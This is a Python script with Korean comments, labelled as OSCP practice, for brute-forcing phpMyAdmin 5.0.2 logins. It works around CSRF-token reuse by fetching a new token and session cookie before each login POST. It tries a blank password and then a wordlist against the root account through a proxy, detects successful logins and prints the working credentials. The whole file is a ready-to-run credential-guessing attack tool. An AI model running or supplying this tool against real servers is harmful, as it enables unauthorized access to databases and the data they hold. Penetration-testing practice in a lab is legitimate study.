#!/usr/bin/env python3
"""
phpMyAdmin 로그인 브루트포스 (OSCP 연습용)

Hydra가 전부 실패한 이유
------------------------
phpMyAdmin 5.0.2는 쿠키 인증(cookie auth) 방식이라
  1) 로그인 페이지 GET -> 세션 쿠키(phpMyAdmin=...) + CSRF 토큰(token) 확보
  2) 같은 세션으로 그 토큰을 포함해 POST
순서를 매 시도마다 반복해야 한다. Hydra의 http-post-form은 토큰을 한 번만
읽어 재사용하므로 이후 시도가 모두 거부된다(Token mismatch).
=> 이 스크립트는 "GET(토큰/쿠키) -> POST(로그인)" 체인을 직접 구현한다.

사용 예
-------
  # 대상/프록시 확인만 (실제 브루트포스 X)
  python3 brute_pma.py --check

  # 빈 비밀번호 + 워드리스트
  python3 brute_pma.py -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt

  # 서버 선택(1=MySQL 5.7.31, 2=MariaDB 10.4.13), verbose
  python3 brute_pma.py --server 1 -v
"""

import argparse
import random
import re
import string
import sys
import time
from pathlib import Path

import requests

DEFAULT_URL = "http://127.0.0.1:8080/phpmyadmin/index.php"
DEFAULT_PROXY = "http://192.168.199.189:3128"
DEFAULT_WORDLIST = "/usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt"

TIMEOUT = 15
RETRIES = 3

TOKEN_RE = re.compile(r'name="token"\s+value="([^"]+)"')
MYSQL_ERR_RE = re.compile(r"#(\d{4})\s*-\s*([^<]+)")
LOGIN_FORM_RE = re.compile(r'id="loginform"|name="pma_username"')
LOGGED_IN_RE = re.compile(r"logged_in:true")
NO_PASSWORD_RE = re.compile(r"Login without a password is forbidden", re.I)
TOKEN_MISMATCH_RE = re.compile(r"Token mismatch|session has expired", re.I)


class ProbeError(Exception):
    """요청 자체가 실패했거나(프록시/네트워크) 페이지 구조를 해석할 수 없을 때."""


def build_session(headers_user_agent: str = "") -> requests.Session:
    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": headers_user_agent
            or "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
        }
    )
    return s


def request(session: requests.Session, method: str, url: str, proxies: dict, **kwargs):
    """프록시 체인이 뚝뚝 끊기는 환경(proxychains/Squid) 대비 재시도 래퍼."""
    last = None
    for attempt in range(1, RETRIES + 1):
        try:
            return session.request(method, url, proxies=proxies, timeout=TIMEOUT, **kwargs)
        except requests.exceptions.RequestException as e:
            last = e
            time.sleep(0.5 * attempt)
    raise ProbeError(f"{method} {url} 실패 ({RETRIES}회 재시도): {last}")


def fetch_token(session: requests.Session, url: str, proxies: dict) -> str:
    """로그인 페이지에서 CSRF 토큰을 뽑는다. 세션 쿠키는 session이 유지."""
    resp = request(session, "GET", url, proxies)
    if resp.status_code != 200:
        raise ProbeError(f"로그인 페이지 로드 실패 (HTTP {resp.status_code})")

    m = TOKEN_RE.search(resp.text)
    if not m:
        raise ProbeError("토큰 추출 실패 (폼 구조 변경 또는 프록시가 HTML을 변조했을 가능성)")
    return m.group(1)


def mysql_error(html: str) -> str:
    """응답 본문에서 MySQL 오류 문구를 뽑아 사람이 읽을 수 있게 정리."""
    if NO_PASSWORD_RE.search(html):
        return "AllowNoPassword 가 꺼져 있음 (빈 비밀번호 로그인 차단)"

    m = MYSQL_ERR_RE.search(html)
    if m:
        return f"#{m.group(1)} {m.group(2).strip()}"

    mm = TOKEN_MISMATCH_RE.search(html)
    if mm:
        return "토큰/세션 불일치"

    return "알 수 없는 응답"


def is_failure_page(html: str) -> bool:
    """
    로그인 실패 판별 기준.
    실패하면 phpMyAdmin은 200으로 로그인 폼(body id=loginform)을 다시 렌더링한다.
    'Access denied' 같은 문자열은 로캘/버전에 따라 흔들리므로 폼 존재 여부로 본다.
    """
    return bool(LOGIN_FORM_RE.search(html))


def verify_logged_in(session: requests.Session, url: str, proxies: dict) -> bool:
    """302 이후 실제로 로그인 상태인지 확인 (CommonParams의 logged_in:true)."""
    try:
        resp = request(session, "GET", url, proxies, allow_redirects=True)
    except ProbeError:
        # 302 자체를 성공 신호로 인정 (검증은 수동으로)
        return True
    return bool(LOGGED_IN_RE.search(resp.text))


def login_attempt(
    session: requests.Session,
    url: str,
    proxies: dict,
    username: str,
    password: str,
    server: str,
    lang: str = "en",
) -> tuple[str, str]:
    """
    비밀번호 하나 시도.
    반환: ("success" | "fail" | "retry", 상세메시지)
    """
    token = fetch_token(session, url, proxies)

    data = {
        "pma_username": username,
        "pma_password": password,
        "server": server,
        "target": "index.php",
        "token": token,
        "lang": lang,
    }

    # 리다이렉트를 직접 판단하려고 allow_redirects=False
    resp = request(session, "POST", url, proxies, data=data, allow_redirects=False)

    # 성공: 302 (index.php?server=N&lang=en) + 로그인 폼 없음
    if resp.status_code in (301, 302, 303, 307):
        if is_failure_page(resp.text):
            return "retry", "302지만 본문이 로그인 폼 (세션 꼬임 의심)"
        if verify_logged_in(session, url, proxies):
            return "success", f"로그인 성공 (HTTP {resp.status_code})"
        return "success", f"302 응답 (logged_in 확인 실패, 수동 검증 필요)"

    if resp.status_code != 200:
        return "retry", f"예상 밖 응답 HTTP {resp.status_code}"

    # 실패: 200 + 로그인 폼 재출력
    if is_failure_page(resp.text):
        detail = mysql_error(resp.text)
        if "토큰/세션 불일치" in detail:
            return "retry", detail
        if "AllowNoPassword" in detail:
            # 설정 문제이므로 브루트포스를 계속해도 의미 없음
            return "fatal", detail
        return "fail", detail

    # 200인데 로그인 폼이 없으면 대시보드에 도달한 것
    return "success", "로그인 폼이 사라짐 (성공 추정)"


def load_passwords(wordlist: Path | None, limit: int = 0) -> list[str]:
    """빈 비밀번호를 가장 먼저 시도하고, 이후 워드리스트를 중복 제거해 붙인다."""
    candidates = [""]

    if wordlist and wordlist.is_file():
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            candidates += [line.strip() for line in f if line.strip()]
    elif wordlist:
        print(f"[!] 워드리스트 없음: {wordlist} (빈 비밀번호만 시도)")

    seen, ordered = set(), []
    for pw in candidates:
        if pw not in seen:
            seen.add(pw)
            ordered.append(pw)

    if limit > 0:
        ordered = ordered[:limit]
    return ordered


def fmt_eta(seconds: float) -> str:
    seconds = int(max(seconds, 0))
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h}h{m:02d}m{s:02d}s"


def run_check(session, args, proxies) -> int:
    """실제 브루트포스 전에 판별 로직이 대상에서 동작하는지 1회 점검."""
    fake = "".join(random.choices(string.ascii_letters + string.digits, k=12))
    print(f"[+] 점검용 임의 비밀번호: '{fake}' (실패가 정상)")
    try:
        token = fetch_token(session, args.url, proxies)
        print(f"[+] 토큰 획득 OK: {token}")
        state, detail = login_attempt(
            session, args.url, proxies, args.user, fake, args.server, args.lang
        )
    except ProbeError as e:
        print(f"[!] 실패: {e}")
        return 1

    print(f"[+] 판별 결과: {state} / {detail}")
    if state == "fail":
        print("[+] 실패 페이지를 정상적으로 인식했습니다. 브루트포스 진행 가능.")
        return 0
    print("[!] 예상과 다른 결과입니다. --server 값이나 대상 URL을 확인하세요.")
    return 1


def main() -> int:
    p = argparse.ArgumentParser(description="phpMyAdmin CSRF 토큰 대응 브루트포서")
    p.add_argument("--url", default=DEFAULT_URL, help=f"로그인 URL (기본: {DEFAULT_URL})")
    p.add_argument("--proxy", default=DEFAULT_PROXY, help=f"Squid 프록시 (기본: {DEFAULT_PROXY})")
    p.add_argument("--no-proxy", action="store_true", help="프록시 없이 직접 접속")
    p.add_argument("-u", "--user", default="root", help="사용자명 (기본: root)")
    p.add_argument("--server", default="1", help="phpMyAdmin 서버 번호 (1=MySQL, 2=MariaDB)")
    p.add_argument("--lang", default="en", help="로그인 폼 언어 (기본: en)")
    p.add_argument("-P", "--wordlist", default=DEFAULT_WORDLIST, help="비밀번호 워드리스트")
    p.add_argument("-f", "--first", action="store_true", help="첫 성공에서 종료")
    p.add_argument("-l", "--limit", type=int, default=0, help="최대 시도 개수 (0=전체)")
    p.add_argument("-v", "--verbose", action="store_true", help="매 시도 출력")
    p.add_argument("--check", action="store_true", help="판별 로직만 1회 점검")
    args = p.parse_args()

    proxies = {} if args.no_proxy else {"http": args.proxy, "https": args.proxy}
    session = build_session()

    if args.check:
        return run_check(session, args, proxies)

    passwords = load_passwords(Path(args.wordlist), args.limit)
    if not passwords:
        print("[!] 시도할 비밀번호가 없습니다.")
        return 1

    print(f"[+] 대상      : {args.url}")
    print(f"[+] 프록시    : {args.proxy if not args.no_proxy else '없음'}")
    print(f"[+] 계정      : {args.user} (server={args.server})")
    print(f"[+] 시도 개수 : {len(passwords)}")
    print("-" * 60)

    started = time.time()
    found = None

    for idx, password in enumerate(passwords, 1):
        try:
            state, detail = login_attempt(
                session, args.url, proxies, args.user, password, args.server, args.lang
            )
        except ProbeError as e:
            # 프록시가 죽었을 수 있으므로 세션을 새로 만들고 잠시 대기
            print(f"\n[!] [{idx}] {e}")
            time.sleep(2)
            session = build_session()
            continue

        if state == "success":
            found = password
            print(f"\n[+] [{idx}/{len(passwords)}] 성공: 사용자 '{args.user}' / 비밀번호 '{password}'")
            print(f"[+]   {detail}")
            if args.first:
                break
            continue

        if state == "fatal":
            print(f"\n[!] 중단: {detail}")
            print("[!] phpMyAdmin 설정 문제이므로 빈 비밀번호로는 로그인 불가 (다른 계정/경로 필요)")
            return 1

        if args.verbose:
            shown = password if password else "<빈 비밀번호>"
            print(f"[-] [{idx}/{len(passwords)}] '{shown}' -> {detail}")
        elif state == "retry":
            print(f"\n[~] [{idx}] 재시도: {detail}")

        if not args.verbose and idx % 25 == 0:
            elapsed = time.time() - started
            rate = idx / elapsed if elapsed else 0
            eta = fmt_eta((len(passwords) - idx) / rate) if rate else "?"
            print(f"\r[.] {idx}/{len(passwords)}  {rate:.1f}/s  ETA {eta}      ", end="", flush=True)

    print()
    print("-" * 60)
    if found is not None:
        print(f"[!] 사용 가능한 크리덴셜: {args.user}:{found}")
        return 0

    print("[!] 일치하는 비밀번호 없음.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
